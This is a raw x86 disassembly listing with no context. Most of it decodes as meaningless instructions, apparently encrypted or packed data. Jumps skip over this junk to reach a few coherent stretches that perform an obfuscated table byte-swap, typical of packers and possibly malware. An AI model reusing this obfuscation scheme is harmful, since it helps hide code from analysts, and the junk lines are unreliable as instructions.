  40c0bd:	sub    ecx,DWORD PTR [ecx+0x17aaae19]
  40c0c3:	and    eax,0x3814829f
  40c0c8:	xchg   ebx,eax
  40c0c9:	fimul  DWORD PTR [edi]
  40c0cb:	rcl    DWORD PTR [eax+0x32ee833c],0x49
  40c0d2:	pop    esi
  40c0d3:	mov    ebx,0xeb5c7164
  40c0d8:	fstp   st(3)
  40c0da:	popa   
  40c0db:	std    
  40c0dc:	aas    
  40c0dd:	xor    BYTE PTR [edi-0x10],ch
  40c0e0:	and    ecx,ebp
  40c0e2:	outs   dx,DWORD PTR ds:[esi]
  40c0e3:	scas   eax,DWORD PTR es:[edi]
  40c0e4:	pusha  
  40c0e5:	sbb    BYTE PTR [edx+0x5acc2862],bl
  40c0eb:	mov    edx,DWORD PTR [ebp-0x3c]
  40c0ee:	mov    edi,DWORD PTR [ebp-0x4]
  40c0f1:	xor    edi,eax
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	ds mov sp,sp
  40c144:	(bad)  [edi+0x6c]
  40c147:	mov    esi,DWORD PTR cs:[eax+0x70]
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c0f3
  40c150:	inc    ebx
  40c151:	rcr    BYTE PTR [edi+ebp*1],1
  40c154:	test   eax,0x71dbc19e
  40c159:	daa    
  40c15a:	jl     0x40c1c5
  40c15c:	sar    DWORD PTR [eax*8-0x5c237d4],cl
  40c163:	in     al,dx
  40c164:	mov    edx,0xdbffdb0a
  40c169:	push   ss
  40c16a:	adc    bl,BYTE PTR [esi]
  40c16c:	ror    BYTE PTR [ebx+0x21061912],0x3d
  40c173:	js     0x40c199
  40c175:	rol    BYTE PTR ds:0x8d592e27,1
  40c17b:	aam    0xf7
  40c17d:	pop    edx
  40c17e:	jle    0x40c173
  40c180:	fisttp DWORD PTR fs:[edx+0x652e7253]
  40c187:	aaa    
  40c188:	std    
  40c189:	mov    edi,0x3e76bb24
  40c18e:	and    al,0xc7
  40c190:	daa    
  40c191:	sbb    al,0xeb
  40c193:	inc    esi
  40c194:	in     al,dx
  40c195:	(bad)  
  40c196:	inc    edi
  40c197:	mov    eax,0x61d93e35
  40c19c:	push   eax
  40c19d:	dec    ebx
  40c19e:	xchg   ecx,eax
  40c19f:	int3   
  40c1a0:	or     BYTE PTR [edi+esi*4-0x3f],0xd0
  40c1a5:	xor    esp,DWORD PTR [di-0x3e25]
  40c1aa:	push   ecx
  40c1ab:	inc    eax
  40c1ac:	xor    al,0xe0
  40c1ae:	mov    ds:0xf21c1250,eax
  40c1b3:	div    DWORD PTR [eax+eax*4-0x35]
  40c1b7:	and    DWORD PTR [edi-0x2d57ba43],eax
  40c1bd:	popa   
  40c1be:	ret    0xa705
  40c1c1:	ret    0x68e1
  40c1c4:	mov    bl,0xb7
  40c1c6:	push   ebp
  40c1c7:	xchg   esp,eax
  40c1c8:	leave  
  40c1c9:	xor    eax,0xa4af24ea
  40c1ce:	and    BYTE PTR [edi-0x4c],cl
  40c1d1:	out    dx,eax
  40c1d2:	mov    al,ds:0x796864f7
  40c1d7:	addr16 gs popa 
  40c1da:	cmp    DWORD PTR [eax+esi*1+0x57],eax
  40c1de:	and    al,BYTE PTR [ebp-0x26]
  40c1e1:	sar    BYTE PTR [edx],0xa0
  40c1e4:	stos   DWORD PTR es:[edi],eax
  40c1e5:	scas   eax,DWORD PTR es:[edi]
  40c1e6:	ret    
  40c1e7:	aaa    
  40c1e8:	cmp    BYTE PTR es:[esi],ah
  40c1eb:	sub    DWORD PTR [edx+0x265fbe8],edx
  40c1f1:	jo     0x40c175
  40c1f3:	icebp  
  40c1f4:	pop    ecx
  40c1f5:	call   FWORD PTR [ebx]
  40c1f7:	and    DWORD PTR [esi-0x35],esp
  40c1fa:	je     0x40c267
  40c1fc:	lock push edx
  40c1fe:	cdq    
  40c1ff:	das    
  40c200:	shr    BYTE PTR [esi+0xb],1
  40c203:	mov    eax,0x12801ef8
  40c208:	out    dx,eax
  40c209:	xchg   bl,ch
  40c20b:	and    BYTE PTR ds:[ecx-0x512e2239],bh
  40c212:	nop
  40c213:	arpl   WORD PTR [edx-0x67],bx
  40c216:	mov    eax,0xe0bc3282
  40c21b:	and    DWORD PTR [esi-0x1f6675],eax
  40c221:	je     0x40c21d
  40c223:	pop    edx
  40c225:	sub    BYTE PTR [ebp+0x4f],ah
  40c228:	xchg   edi,eax
  40c229:	(bad)  
  40c22a:	pop    ss
  40c22b:	mov    ch,0x63
  40c22d:	popw   ss
  40c22f:	test   BYTE PTR [eax-0x5402379e],bl
  40c235:	lods   eax,DWORD PTR ds:[esi]
  40c236:	iret   
  40c237:	and    dl,BYTE PTR ds:0xeb3bef44
  40c23d:	in     al,dx
  40c23e:	xchg   ecx,eax
  40c23f:	cmp    esi,edi
  40c241:	(bad)  
  40c243:	ror    BYTE PTR [edx-0x390f734],0xfb
  40c24a:	fcomp  DWORD PTR [ebx-0x7085255c]
  40c250:	(bad)  
  40c251:	into   
  40c252:	jge    0x40c29a
  40c254:	mov    al,0xac
  40c256:	jmp    0x40c291
  40c258:	rcl    BYTE PTR ds:0xa971385a,0x31
  40c25f:	and    DWORD PTR [ebx+ebp*8],eax
  40c262:	in     al,dx
  40c263:	imul   esi,DWORD PTR [esi],0xb5e54dec
  40c269:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c26a:	cmc    
  40c26b:	push   edx
  40c26c:	mov    bl,0x83
  40c26e:	xchg   ecx,eax
  40c26f:	(bad)  
  40c270:	out    0x94,al
  40c272:	adc    BYTE PTR [eax+0xf],ah
  40c275:	jmp    0xe0bfd20b
  40c27a:	mov    ebp,0x15912850
  40c27f:	jl     0x40c24f
  40c281:	fidiv  WORD PTR [eax+eiz*4]
  40c284:	sbb    DWORD PTR [ebp+0x22b48de9],eax
  40c28a:	pop    edi
  40c28b:	adc    eax,DWORD PTR ss:[edx]
  40c28e:	adc    DWORD PTR [ebx],esi
  40c290:	and    BYTE PTR [esi-0xf56d4af],al
  40c296:	push   es
  40c297:	xchg   ebx,eax
  40c298:	popa   
  40c299:	xchg   ecx,eax
  40c29a:	(bad)  [edi+edx*8-0x25]
  40c29e:	bound  ecx,QWORD PTR [eax]
  40c2a0:	and    ecx,ecx
  40c2a2:	loope  0x40c269
  40c2a4:	sti    
  40c2a5:	xchg   esp,eax
  40c2a6:	dec    esi
  40c2a7:	adc    ah,BYTE PTR [edi+edi*8-0x5b]
  40c2ab:	xchg   bl,bl
  40c2ad:	pop    esi
  40c2ae:	out    0x5b,al
  40c2b0:	pushf  
  40c2b1:	push   esp
  40c2b2:	xlat   BYTE PTR ds:[ebx]
  40c2b3:	jecxz  0x40c2dd
  40c2b5:	sbb    al,0x97
  40c2b7:	cmp    esi,DWORD PTR es:[edi+ebx*8]
  40c2bb:	jns    0x40c251
  40c2bd:	jmp    0x634d:0x764dfc1d
  40c2c4:	in     al,0x97
  40c2c6:	scas   al,BYTE PTR es:[edi]
  40c2c7:	cmp    eax,edx
  40c2c9:	int    0x39
  40c2cb:	hlt    
  40c2cc:	jbe    0x40c2af
  40c2ce:	out    dx,eax
  40c2cf:	push   0xc20e4d69
  40c2d4:	loopne 0x40c2d8
  40c2d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2d7:	xor    DWORD PTR [eax-0x2069bc81],esp
  40c2dd:	scas   eax,DWORD PTR es:[edi]
  40c2de:	scas   al,BYTE PTR es:[edi]
  40c2df:	pop    edi
  40c2e0:	fisubr WORD PTR [ebp-0x6e78f0d5]
  40c2e6:	addr16 xchg ecx,eax
  40c2e8:	add    DWORD PTR [ecx+0x17],0x23a25bcb
  40c2ef:	cld    
  40c2f0:	pop    ds
  40c2f1:	(bad)  
  40c2f2:	hlt    
  40c2f3:	pop    esi
  40c2f4:	push   edi
  40c2f5:	ds out dx,al
  40c2f7:	pop    edx
  40c2f8:	and    eax,0xb0373cff
  40c2fd:	and    al,0xee
  40c2ff:	adc    al,0x29
  40c301:	fist   WORD PTR [eax+eiz*4+0x4b7fe494]
  40c308:	ret    0xd29
  40c30b:	cmp    bh,BYTE PTR [esi-0x5d8ba06b]
  40c311:	inc    esi
  40c313:	outs   dx,DWORD PTR ds:[esi]
  40c314:	das    
  40c315:	ss repz push ecx
  40c318:	mov    ds:0x28267789,eax
  40c31d:	jae    0x40c33f
  40c31f:	push   edx
  40c320:	and    DWORD PTR [ecx-0x3c],eax
  40c323:	(bad)  
  40c324:	lea    edi,[esi]
  40c326:	mov    cl,0xa2
  40c328:	je     0x40c343
  40c32a:	test   DWORD PTR [ecx-0x49],0x6a7efc0a
  40c331:	std    
  40c332:	cmp    dh,dh
  40c334:	outs   dx,BYTE PTR ds:[esi]
  40c335:	push   ss
  40c336:	dec    esp
  40c337:	xor    DWORD PTR [ebx+0x77],eax
  40c33a:	mov    BYTE PTR [eax-0x5c],dl
  40c33d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c33e:	scas   eax,DWORD PTR es:[edi]
  40c33f:	xchg   esi,eax
  40c340:	out    0x99,al
  40c342:	mov    eax,ds:0x60dd4b7f
  40c347:	sub    al,0x76
  40c349:	push   es
  40c34a:	shr    eax,cl
  40c34c:	aaa    
  40c34d:	mov    edx,0xdbff074
  40c352:	ror    BYTE PTR [eax],cl
  40c354:	pop    eax
  40c355:	outs   dx,DWORD PTR ds:[esi]
  40c356:	into   
  40c357:	(bad)  
  40c358:	dec    eax
  40c359:	or     BYTE PTR [esi+edx*2-0x245da743],bl
  40c360:	jbe    0x40c2fe
  40c362:	xchg   edi,eax
  40c363:	fcmove st,st(1)
  40c365:	mov    DWORD PTR ds:0x7a1ab05e,0x19c97de7
  40c36f:	add    eax,0x489f5fe4
  40c374:	or     eax,0x384ea909
  40c379:	cli    
  40c37a:	sub    eax,esi
  40c37c:	outs   dx,DWORD PTR ds:[esi]
  40c37d:	sar    BYTE PTR [ebx-0x466e70b6],0xe1
  40c384:	inc    ebp
  40c385:	mov    dl,0x22
  40c387:	dec    ecx
  40c388:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c389:	adc    bh,BYTE PTR [edi-0x46fecead]
  40c38f:	push   es
  40c390:	or     ah,BYTE PTR [ecx-0x52f83931]
  40c396:	sbb    esp,DWORD PTR [edx]
  40c398:	loopne 0x40c371
  40c39a:	jmp    0x617500e8
  40c39f:	mov    ah,0x47
  40c3a1:	mov    cl,0xf
  40c3a3:	gs (bad) 
  40c3a5:	pop    esp
  40c3a6:	es das 
  40c3a8:	push   esi
  40c3a9:	(bad)  
  40c3ab:	push   edi
  40c3ac:	lods   al,BYTE PTR ds:[esi]
  40c3ad:	push   es
  40c3ae:	mov    bl,0xbe
  40c3b0:	bndstx [edx+0x53],bnd1
  40c3b4:	jmp    0x2ba47162
  40c3b9:	jns    0x40c437
  40c3bb:	cli    
  40c3bc:	add    DWORD PTR [eax-0x481b9d5f],0x874b16d0
  40c3c6:	lahf   
  40c3c7:	cmp    al,0x87
  40c3c9:	mov    ecx,0x90da0247
  40c3ce:	add    al,0x2
  40c3d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3d1:	mov    dh,0x54
  40c3d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3d4:	mov    ah,BYTE PTR [edx-0xa335a83]
  40c3da:	dec    ecx
  40c3db:	or     esi,edi
  40c3dd:	cdq    
  40c3de:	push   cs
  40c3df:	mov    dl,0x31
  40c3e1:	dec    ebp
  40c3e2:	jle    0x40c44c
  40c3e4:	cli    
  40c3e5:	(bad)
  40c3e8:	aam    0x16
  40c3ea:	aad    0x93
  40c3ec:	jae    0x40c447
  40c3ee:	cwde   
  40c3ef:	jae    0x40c438
  40c3f1:	dec    edi
  40c3f2:	push   ss
  40c3f3:	out    0x79,al
  40c3f5:	inc    ebx
  40c3f6:	dec    ecx
  40c3f7:	mov    gs,WORD PTR [ebx-0x68212ba0]
  40c3fd:	mov    bh,0xc7
  40c3ff:	dec    eax
  40c400:	je     0x40c402
  40c402:	gs sar ebx,0x92
  40c406:	push   esp
  40c407:	push   ss
  40c408:	arpl   WORD PTR [esi],dx
  40c40a:	and    al,0x66
  40c40c:	int    0xb0
  40c40e:	mov    WORD PTR [edx-0x7dd97b55],ds
  40c414:	push   ss
  40c415:	jmp    0x40c3f7
  40c417:	cdq    
  40c418:	lods   eax,DWORD PTR ds:[esi]
  40c419:	jle    0x40c482
  40c41b:	xabort 0x31
  40c41e:	ins    DWORD PTR es:[edi],dx
  40c41f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c420:	(bad)  
  40c421:	js     0x40c475
  40c423:	xchg   edi,eax
  40c424:	in     eax,0x17
  40c426:	fisttp QWORD PTR [eax]
  40c428:	jnp    0x40c410
  40c42a:	stc    
  40c42b:	jmp    0x8c7d1773
  40c430:	scas   al,BYTE PTR es:[edi]
  40c431:	aad    0x87
  40c433:	fucom  st(0)
  40c435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c436:	cmp    eax,0x273e88c7
  40c43b:	int    0xa7
  40c43d:	mov    esi,esi
  40c43f:	or     eax,0xa7c10572
  40c444:	cmp    edx,edi
  40c446:	add    eax,0xcd9bab14
  40c44b:	aam    0x70
  40c44d:	ja     0x40c3d5
  40c44f:	mov    al,0x97
  40c451:	mov    eax,ds:0xa040ce2c
  40c456:	inc    esp
  40c457:	push   0xddbfac35
  40c45c:	dec    eax
  40c45d:	add    al,0x40
  40c45f:	pop    ebp
  40c460:	out    0xcb,al
  40c462:	push   esp
  40c463:	sbb    ebx,edx
  40c465:	fs push ds
  40c467:	xchg   ebx,eax
  40c468:	addr16 mov edx,0xf4d0f0c
  40c46e:	rol    BYTE PTR ds:[ecx],cl
  40c471:	inc    esp
  40c472:	mov    dh,0x7a
  40c474:	ficom  WORD PTR [ebp+edx*2+0x31b26ace]
  40c47b:	adc    al,0xb9
  40c47d:	push   ebx
  40c47e:	dec    edx
  40c47f:	jne    0x40c4be
  40c481:	mov    bh,0x41
  40c483:	sbb    DWORD PTR [eax-0x58],eax
  40c486:	dec    DWORD PTR [ebp+0x5c877763]
  40c48c:	in     al,dx
  40c48d:	push   0x7014c07f
  40c492:	loop   0x40c416
  40c494:	iret   
  40c495:	sbb    DWORD PTR [esi+0x439a3f10],ebx
  40c49b:	xchg   edx,eax
  40c49c:	dec    esp
  40c49d:	mov    ah,0xc9
  40c49f:	sahf   
  40c4a0:	loop   0x40c4f2
  40c4a2:	pop    edx
  40c4a3:	loop   0x40c454
  40c4a5:	or     BYTE PTR [edi],cl
  40c4a7:	clc    
  40c4a8:	sbb    al,0xca
  40c4aa:	scas   eax,DWORD PTR es:[edi]
  40c4ab:	inc    ebp
  40c4ac:	cld    
  40c4ad:	rcl    dl,cl
  40c4af:	lock cmp eax,0x75
  40c4b3:	xchg   ecx,eax
  40c4b4:	and    BYTE PTR [edx-0xe],al
  40c4b7:	xor    eax,0x43323aeb
  40c4bc:	xchg   ebx,eax
  40c4bd:	aas    
  40c4be:	fsubr  st(4),st
  40c4c0:	cld    
  40c4c1:	push   es
  40c4c2:	out    0xe1,eax
  40c4c4:	lods   al,BYTE PTR ds:[esi]
  40c4c5:	nop
  40c4c6:	rcl    DWORD PTR [esp+esi*1-0x5b],1
  40c4ca:	lods   eax,DWORD PTR ds:[esi]
  40c4cb:	adc    BYTE PTR [ebx+0x28],cl
  40c4ce:	leave  
  40c4cf:	in     al,dx
  40c4d0:	push   ebx
  40c4d1:	popa   
  40c4d2:	sar    DWORD PTR [esi-0x51],1
  40c4d5:	jge    0x40c506
  40c4d7:	(bad)
  40c4da:	xor    eax,0x99c42b95
  40c4df:	dec    BYTE PTR [esi-0x2a]
  40c4e2:	push   ds
  40c4e3:	(bad)  
  40c4e4:	clc    
  40c4e5:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40c4e7:	mov    ebx,0x35dfbeb8
  40c4ec:	mov    ch,0xf2
  40c4ee:	lods   eax,DWORD PTR ds:[esi]
  40c4ef:	inc    esi
  40c4f0:	xor    edx,eax
  40c4f2:	add    edx,DWORD PTR [ebp-0x14]
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	mov    ss,edx
  40c542:	jg     0x40c570
  40c544:	dec    ebp
  40c545:	mov    BYTE PTR [eax+0x70],dh
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c540
  40c54d:	cmc    
  40c54e:	jle    0x40c4f3
  40c550:	add    BYTE PTR [edx-0xc],dh
  40c553:	jb     0x40c4d8
  40c555:	xchg   ebx,eax
  40c556:	out    dx,eax
  40c557:	push   eax
  40c558:	push   ecx
  40c559:	push   ss
  40c55a:	in     eax,0xd7
  40c55c:	adc    al,0xfb
  40c55e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c55f:	lock test al,0x75
  40c562:	(bad)  
  40c563:	in     eax,dx
  40c564:	mov    bl,0x22
  40c566:	aaa    
  40c567:	xchg   edx,eax
  40c568:	mov    BYTE PTR [eax-0x3fdb3d8],ch
  40c56e:	xchg   ecx,eax
  40c56f:	dec    ecx
  40c570:	int    0xa2
  40c572:	sbb    esi,DWORD PTR [edx-0x6cc4299d]
  40c578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c579:	dec    ebx
  40c57a:	push   edi
  40c57b:	(bad)  
  40c57c:	pushf  
  40c57d:	jp     0x40c502
  40c57f:	arpl   WORD PTR [edx-0x48],dx
  40c582:	xchg   ebx,eax
  40c583:	inc    ebx
  40c584:	jnp    0x40c5a7
  40c586:	aaa    
  40c587:	add    esp,esi
  40c589:	adc    esi,esp
  40c58b:	aas    
  40c58c:	add    al,0xde
  40c58e:	xchg   edi,eax
  40c58f:	out    0xc6,eax
  40c591:	inc    edx
  40c592:	scas   al,BYTE PTR es:[edi]
  40c593:	or     DWORD PTR [edi-0x1ec498d7],esi
  40c599:	jmp    0x40c5df
  40c59b:	vhaddpd ymm7,ymm2,ymm7
  40c59f:	dec    eax
  40c5a0:	cmc    
  40c5a1:	imul   ebx,DWORD PTR [edi+0x4],0xa361719f
  40c5a8:	fcomip st,st(1)
  40c5aa:	test   BYTE PTR [ebx+0x28],ch
  40c5ad:	xchg   ecx,eax
  40c5ae:	and    eax,0x62051533
  40c5b3:	imul   edx,DWORD PTR [ebx],0xcd2161ff
  40c5b9:	add    ebp,eax
  40c5bb:	(bad)  
  40c5bc:	push   0xffffffc7
  40c5be:	inc    ebx
  40c5bf:	mov    edi,0x1e079fe9
  40c5c4:	jge    0x40c617
  40c5c6:	rcl    ch,0x91
  40c5c9:	sbb    al,0x25
  40c5cb:	push   eax
  40c5cc:	(bad)  
  40c5cd:	hlt    
  40c5ce:	in     eax,dx
  40c5cf:	repz test eax,0x2d388004
  40c5d5:	(bad)  
  40c5d7:	(bad)  
  40c5d8:	sub    esi,DWORD PTR [edi-0x60f17d1d]
  40c5de:	mov    eax,ds:0x1ba366c5
  40c5e3:	mov    eax,ds:0xa675bbb0
  40c5e8:	test   eax,ebx
  40c5ea:	jp     0x40c597
  40c5ec:	hlt    
  40c5ed:	int    0xc1
  40c5ef:	jmp    0xb78f:0x54284046
  40c5f6:	mov    ds:0x69c95de1,al
  40c5fb:	loop   0x40c5f1
  40c5fd:	ins    DWORD PTR es:[edi],dx
  40c5fe:	(bad)  
  40c5ff:	sbb    eax,0xb3180056
  40c604:	push   ebx
  40c605:	sbb    eax,0xa2f95655
  40c60a:	dec    DWORD PTR [ecx-0x3d]
  40c60d:	xor    DWORD PTR [ebx],eax
  40c60f:	adc    eax,DWORD PTR [ebx+ebp*2]
  40c612:	(bad)  
  40c613:	outs   dx,BYTE PTR ds:[esi]
  40c614:	push   0xe5e913d3
  40c619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c61a:	outs   dx,DWORD PTR es:[esi]
  40c61c:	sbb    cl,BYTE PTR [edx+edx*2]
  40c61f:	rcr    BYTE PTR [eax],1
  40c621:	pusha  
  40c622:	sbb    DWORD PTR [esi+0x6f585a2f],edx
  40c628:	mov    eax,0x77f1ecec
  40c62d:	sbb    BYTE PTR [edx+0x63],al
  40c630:	sahf   
  40c631:	push   esp
  40c632:	mov    edx,0xb45d1eb6
  40c637:	sbb    al,0x21
  40c639:	dec    ecx
  40c63a:	jns    0x40c5e2
  40c63c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c63d:	pop    ebp
  40c63e:	(bad)  
  40c63f:	jb     0x40c65c
  40c641:	retf   
  40c642:	xchg   esp,eax
  40c644:	aam    0x73
  40c646:	fbstp  TBYTE PTR [ebp-0x3086a323]
  40c64c:	out    0xbb,al
  40c64e:	xchg   esp,eax
  40c64f:	lock dec esi
  40c651:	and    bl,bh
  40c653:	dec    ebx
  40c654:	nop
  40c655:	and    esp,edx
  40c657:	push   edi
  40c658:	test   BYTE PTR [esi],dl
  40c65a:	out    dx,eax
  40c65b:	mov    ds:0x61a00ba2,eax
  40c660:	xor    DWORD PTR [edx-0x6c008e2b],eax
  40c666:	mov    ebp,0x6cb8985c
  40c66b:	fsubp  st(1),st
  40c66d:	and    bl,BYTE PTR [ebx]
  40c66f:	push   ecx
  40c670:	pop    ss
  40c671:	dec    ebx
  40c672:	xor    al,0x12
  40c674:	cs das 
  40c676:	repz mov edi,0x252e792f
  40c67c:	dec    edi
  40c67d:	imul   dl
  40c67f:	mov    ch,BYTE PTR [ecx+edx*2]
  40c682:	jno    0x40c674
  40c684:	test   eax,0xc7ec7ab3
  40c689:	jb     0x40c62d
  40c68b:	mov    ecx,0xe241cb5b
  40c690:	and    eax,0x9f415b9
  40c695:	sbb    al,0x98
  40c697:	fmul   QWORD PTR [edi]
  40c699:	rcr    bh,0x0
  40c69c:	or     DWORD PTR [edx],edi
  40c69e:	add    eax,0xf78aaea4
  40c6a3:	xlat   BYTE PTR ds:[ebx]
  40c6a4:	cmp    ah,BYTE PTR [edi-0xf6b4a19]
  40c6aa:	inc    edi
  40c6ab:	out    0x72,eax
  40c6ad:	mov    eax,ds:0xe5bf06be
  40c6b2:	loope  0x40c676
  40c6b4:	rol    BYTE PTR [edi],1
  40c6b6:	mov    DWORD PTR [eax-0x4d],ebp
  40c6b9:	and    ecx,DWORD PTR [ebp-0x33]
  40c6bc:	pop    ss
  40c6bd:	sub    bl,BYTE PTR [ecx-0x3dc13ea9]
  40c6c3:	(bad)  
  40c6c4:	(bad)  
  40c6c6:	call   DWORD PTR [edi+0x2b]
  40c6c9:	or     DWORD PTR [edx+0x508750ef],esp
  40c6cf:	xchg   ebp,eax
  40c6d0:	push   esp
  40c6d1:	push   cs
  40c6d2:	(bad)  
  40c6d3:	sbb    al,bh
  40c6d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6d6:	or     esp,DWORD PTR [edi]
  40c6d8:	jo     0x40c72e
  40c6da:	cmp    al,0x55
  40c6dc:	fld    TBYTE PTR [ecx+0x47]
  40c6df:	dec    edi
  40c6e0:	xor    ebp,DWORD PTR [edi-0x439b8cc]
  40c6e6:	idiv   ecx
  40c6e8:	xchg   edx,eax
  40c6e9:	mov    ch,0x99
  40c6eb:	jne    0x40c764
  40c6ed:	mov    esi,0x4d18ef71
  40c6f2:	pop    es
  40c6f3:	cmp    DWORD PTR [ecx+0x4e],eax
  40c6f6:	lea    ebx,[eax+0x1]
  40c6f9:	mov    ds:0xa726587a,al
  40c6fe:	pop    ebx
  40c6ff:	or     BYTE PTR [edi+ebx*8+0x6f],bh
  40c703:	mov    DWORD PTR [ecx+ecx*1+0x39710de],eax
  40c70a:	bound  esp,QWORD PTR [ecx-0x15]
  40c70d:	lods   eax,DWORD PTR ds:[esi]
  40c70e:	dec    ebx
  40c70f:	stos   BYTE PTR es:[edi],al
  40c710:	stos   DWORD PTR es:[edi],eax
  40c711:	jno    0x40c722
  40c713:	shr    BYTE PTR [eax+0x7d],cl
  40c716:	inc    edi
  40c717:	push   edi
  40c718:	cmp    ch,dl
  40c71a:	and    edx,DWORD PTR [eax+0x2b]
  40c71d:	jmp    0x40c6fd
  40c71f:	inc    eax
  40c720:	dec    ah
  40c722:	cmp    cl,0xf5
  40c725:	xor    ch,BYTE PTR [eax+0x396909a0]
  40c72b:	push   eax
  40c72c:	jmp    0x40c79f
  40c72e:	das    
  40c72f:	mov    ebp,0x6ecd9d8f
  40c734:	inc    ebx
  40c735:	test   eax,eax
  40c737:	clc    
  40c738:	aam    0xa6
  40c73a:	jno    0x40c761
  40c73c:	test   al,0xc3
  40c73e:	xor    al,0x73
  40c740:	xor    edi,DWORD PTR [ebp+0x78]
  40c743:	cs jne 0x40c797
  40c746:	jl     0x40c7aa
  40c748:	dec    ebp
  40c749:	addr16 cwde 
  40c74b:	sub    al,0x2c
  40c74d:	pop    ebp
  40c74e:	out    dx,eax
  40c74f:	loopne 0x40c7ca
  40c751:	or     eax,0x69ca857f
  40c756:	mov    edx,0xed4d1d68
  40c75b:	sahf   
  40c75c:	push   0xffffff88
  40c75e:	sbb    ebp,edx
  40c760:	or     al,0x42
  40c763:	push   0x7e016c9a
  40c768:	nop
  40c769:	cdq    
  40c76a:	sub    edx,DWORD PTR [esi]
  40c76c:	fisttp DWORD PTR [ecx+0xb]
  40c76f:	add    eax,0x176186eb
  40c774:	not    DWORD PTR [ebp+0x27]
  40c777:	pop    ecx
  40c778:	ins    BYTE PTR es:[edi],dx
  40c779:	jl     0x40c77e
  40c77b:	pushf  
  40c77c:	mov    ds:0xcc8c181f,eax
  40c781:	hlt    
  40c782:	inc    esi
  40c783:	sbb    al,0x8e
  40c785:	fdiv   QWORD PTR [ebx+esi*2]
  40c788:	scas   al,BYTE PTR es:[edi]
  40c789:	out    dx,al
  40c78a:	jp     0x40c79f
  40c78c:	pop    ebp
  40c78d:	mov    ds:0xcb936d51,eax
  40c792:	sahf   
  40c793:	pop    edx
  40c794:	sbb    ah,bh
  40c796:	xchg   ebx,eax
  40c797:	aad    0xa7
  40c799:	pop    edi
  40c79a:	mov    dl,ch
  40c79c:	ret    0xc3c7
  40c79f:	(bad)  
  40c7a0:	dec    edi
  40c7a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7a2:	cdq    
  40c7a3:	lds    ebp,FWORD PTR [ebp-0x6bfb3d67]
  40c7a9:	sbb    bh,al
  40c7ab:	js     0x40c817
  40c7ad:	push   0x8a7baae4
  40c7b2:	inc    esi
  40c7b3:	ret    0xf91
  40c7b6:	sbb    bh,BYTE PTR [edx-0x17]
  40c7b9:	add    cl,bl
  40c7bb:	and    eax,DWORD PTR ds:0x4192167c
  40c7c1:	fldcw  WORD PTR [ecx+eiz*1-0x59]
  40c7c5:	add    edi,DWORD PTR [esi+0x3b95f0ec]
  40c7cb:	add    eax,0xb565818c
  40c7d0:	mov    ebx,0x9612030
  40c7d5:	ret    0x1281
  40c7d8:	add    DWORD PTR [edi+0x7a],eax
  40c7db:	xchg   ebp,eax
  40c7dc:	push   ds
  40c7dd:	fwait
  40c7de:	cmp    bl,BYTE PTR [edx-0x5d]
  40c7e1:	rcr    BYTE PTR [ecx+0x4a],0xf5
  40c7e5:	retf   
  40c7e6:	mov    cl,0x51
  40c7e8:	mov    bl,0xa4
  40c7ea:	popa   
  40c7eb:	and    eax,0xd5164ada
  40c7f0:	fs add eax,0xc3a878c6
  40c7f6:	retf   0xe31a
  40c7f9:	(bad)  
  40c7fa:	fcomp  DWORD PTR [ecx-0x22]
  40c7fd:	shr    BYTE PTR [edi+0x14],1
  40c800:	loope  0x40c7e5
